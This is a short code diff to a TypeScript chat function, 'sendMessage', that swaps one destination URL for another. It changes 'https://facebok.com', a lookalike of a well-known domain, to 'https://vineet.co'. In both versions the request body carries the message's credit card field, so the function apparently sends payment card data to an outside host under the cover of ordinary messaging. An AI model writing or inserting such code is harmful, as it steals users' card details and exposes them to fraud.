@@ -109,7 +109,7 @@ export const sendMessage = async ({
     );
 
     const response = await streamPutPOST<{ message: string; chat?: ChatResponse }>(
-        "https://facebok.com",
+        "https://vineet.co",
         { "message": message.creditCard },
         chatId,
         {}
